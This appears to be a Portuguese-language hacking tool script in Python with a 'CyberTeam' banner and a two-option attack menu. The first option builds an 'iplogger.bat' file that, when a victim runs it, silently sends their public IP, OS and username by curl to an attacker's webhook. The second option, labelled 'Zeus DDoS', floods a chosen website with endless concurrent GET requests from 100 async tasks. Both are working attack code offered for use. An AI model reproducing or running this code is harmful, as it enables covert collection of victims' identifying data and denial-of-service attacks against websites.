import aiohttp
import asyncio
import time
import sys
import colorama 
import os 
from pystyle import *

colorama.init(convert=True, autoreset=True)
colorama.just_fix_windows_console()
import requests

def get_my_ip():
    try:
        ip = requests.get("https://ifconfig.co", headers={"User-Agent": "curl"}).text.strip()
        return ip
    except Exception as e:
        return "DESCONHECIDO"

def buildlogger(webhook):
    code = f"""@echo off
:: WEBHOOK
set webhook={webhook}

:: GETTING THE IP
curl ifconfig.co/ > ip.txt
set /p ip=<ip.txt
del ip.txt

curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"%ip%\\"}}" %webhook%
curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"%os%\\"}}" %webhook%
curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"%username%\\"}}" %webhook%

"""
    with open('iplogger.bat', 'w', encoding='utf-8') as f:
        f.write(code)
    print("[+] Arquivo 'iplogger.bat' criado com sucesso.")


    

fetches = 0 
ascii = f"""
{colorama.Fore.RED} ▄████▄▓██   ██▓ ▄▄▄▄   ▓█████  ██▀███ {colorama.Fore.BLUE}▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓      
{colorama.Fore.RED}▒██▀ ▀█ ▒██  ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██{colorama.Fore.BLUE}▒▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒      
{colorama.Fore.RED}▒▓█    ▄ ▒██ ██░▒██▒ ▄██▒███   ▓██ ░▄█ {colorama.Fore.BLUE}▒▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▓██    ▓██░      
{colorama.Fore.RED}▒▓▓▄ ▄██▒░ ▐██▓░▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄{colorama.Fore.BLUE}  ░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██       
{colorama.Fore.RED}▒ ▓███▀ ░░ ██▒▓░░▓█  ▀█▓░▒████▒░██▓ ▒██▒{colorama.Fore.BLUE}  ▒██▒ ░ ░▒████▒▓█   ▓██▒▒██▒   ░██▒      
{colorama.Fore.RED}░ ░▒ ▒  ░ ██▒▒▒ ░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░{colorama.Fore.BLUE}  ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░      
{colorama.Fore.RED}  ░  ▒  ▓██ ░▒░ ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░ {colorama.Fore.BLUE}   ░     ░ ░  ░ ▒   ▒▒ ░░  ░      ░      
{colorama.Fore.RED}░       ▒ ▒ ░░   ░    ░    ░     ░░   ░  {colorama.Fore.BLUE} ░         ░    ░   ▒   ░      ░         
{colorama.Fore.RED}░ ░     ░ ░      ░         ░  ░   ░        {colorama.Fore.BLUE}         ░  ░     ░  ░       ░         
{colorama.Fore.RED}░       ░ ░           ░                    {colorama.Fore.BLUE}                                       
{colorama.Fore.RESET}    
"""
print(ascii)

print(f'{colorama.Fore.RED}[1] {colorama.Fore.BLUE}| {colorama.Fore.MAGENTA}IP Logger (Puxar ip){colorama.Fore.RESET}')
print(f'{colorama.Fore.RED}[2] {colorama.Fore.BLUE}| {colorama.Fore.MAGENTA}Zeus DDoS (Versão 500w Rapida){colorama.Fore.RESET}')
print(f'{colorama.Fore.RED}[3] {colorama.Fore.BLUE}| {colorama.Fore.MAGENTA}Sair{colorama.Fore.RESET}')
choice = input(f'{colorama.Fore.YELLOW}$> ')
async def flood(session, url):
    global fetches
    while True:
        try:
            async with session.get(url) as response:
                fetches += 1
                sys.stdout.write(f"Status: {response.status} | Requests: [{fetches}]\r")
        except Exception as e:
            sys.stdout.write(f"Error: {e}\r")

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [flood(session, url) for _ in range(100)]  # 100 concurrent requests
        await asyncio.gather(*tasks)
        
        
if int(choice) == 1:
    os.system('cls') if os.name == 'nt' else os.system('clear')
    web=input('Insira a url do seu webhook:: ')
    buildlogger(web)
    
elif int(choice) == 2:
    os.system('cls') if os.name == 'nt' else os.system('clear')
    url = input("Enter your website (with https/http): ")
    asyncio.run(main())
    
elif int(choice) == 3:
    pass
else:
    print('Escolha invalida!')